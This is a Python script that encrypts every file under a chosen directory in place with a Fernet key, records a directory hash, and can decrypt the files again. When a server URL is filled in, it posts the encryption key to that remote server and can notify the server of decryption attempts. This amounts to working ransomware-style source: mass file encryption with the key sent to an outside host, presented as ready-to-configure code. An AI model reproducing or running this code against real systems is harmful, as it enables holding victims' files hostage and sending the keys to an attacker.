import os
import time
from cryptography.fernet import Fernet
from os.path import exists
from checksumdir import dirhash
import requests

#################################################
#    POSTING TO SERVER IS NOT ON BY DEFAULT     #
#      SET THE POST URL BELOW THIS COMMENT      #
#          https://github.com/qtchaos           #
#################################################

PostURL = ''  # <---------- INSERT POST URL HERE
notifyServer = False  # Notifies server if files are decrypted.
testConnection = False  # Disables encryption/decryption feature, only POST's to server to check the connection.

##########################################################################
# DON'T EDIT ANYTHING BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING! #
##########################################################################

if not testConnection:
    decrypt = input("What do you want to do? (decrypt/encrypt): ")
    path = input("Enter directory to encrypt/decrypt: ")

    filelist = []
    globalTimeStart = time.perf_counter()

    if decrypt == "decrypt":
        decrypt = True
        if notifyServer:
            NotifyData = 'An attempt has been made at decryption.'
            NotifyHeaders = {"Content-Type": "text/plain; charset=utf-8"}
            requests.post(PostURL, data=NotifyData, headers=NotifyHeaders)
    else:
        decrypt = False

    # key generation
    if not exists('filekey.key'):
        key = Fernet.generate_key()
    else:
        with open('filekey.key', 'rb') as filebytes:
            key = filebytes.read()

    with open('filekey.key', 'wb') as filekey:
        filekey.write(key)

    with open('filekey.key', 'rb') as filekey:
        key = filekey.read()

    fernet = Fernet(key)


def main():
    if not testConnection:
        work()
        if PostURL:
            post()
    else:
        testconnection()


def post():
    headers = {"Content-Type": "application/json; charset=utf-8"}

    x = requests.post(PostURL, json={'key': str(key)[2:-1]}, headers=headers)
    print('POST request: ' + str(x.status_code))


def work():
    for root, dirs, files in os.walk(path):
        for file in files:
            filelist.append(os.path.join(root, file))

    if decrypt:
        fileCount = 1
        for name in filelist:
            tic = time.perf_counter()
            with open(name, 'rb') as enc_file:
                encrypted = enc_file.read()
                decrypted = fernet.decrypt(encrypted)
            with open(name, 'wb') as dec_file:
                dec_file.write(decrypted)
                toc = time.perf_counter()
                print(
                    f"Decrypted file {fileCount} in {toc - tic:0.4f} seconds. Total time: {toc - globalTimeStart:0.4f} seconds")
                fileCount += 1
        with open("checksum.MD5", 'r') as file:
            print('NOT FROZEN, HASH IS BEING GENERATED!')
            generatedHash = dirhash(path, 'md5')
            checkHash = file.read()
            print(f"Hash generated at encryption: {checkHash}, hash generated after decryption: {generatedHash}")
            if checkHash == generatedHash:
                print("HASHES MATCH!")
            else:
                print("HASHES DON'T MATCH!")
    else:
        fileCount = 1
        print("Calculating hash...")
        with open("checksum.MD5", 'w''') as file:
            a = dirhash(path, 'md5')
            file.write(a)
            print(f"Hash of directory: {a}")

        for name in filelist:
            tic = time.perf_counter()
            with open(name, 'rb') as file:
                original = file.read()
                encrypted = fernet.encrypt(original)
            with open(name, 'wb') as encrypted_file:
                encrypted_file.write(encrypted)
                toc = time.perf_counter()
                print(f"Encrypted file {fileCount} in {toc - tic:0.4f} seconds. Total time: {toc - globalTimeStart:0.4f} seconds")
            fileCount += 1


def testconnection():
    data = 'Connection made.'
    headers = {"Content-Type": "text/plain; charset=utf-8"}
    requests.post(PostURL, data=data, headers=headers)


if __name__ == "__main__":
    main()
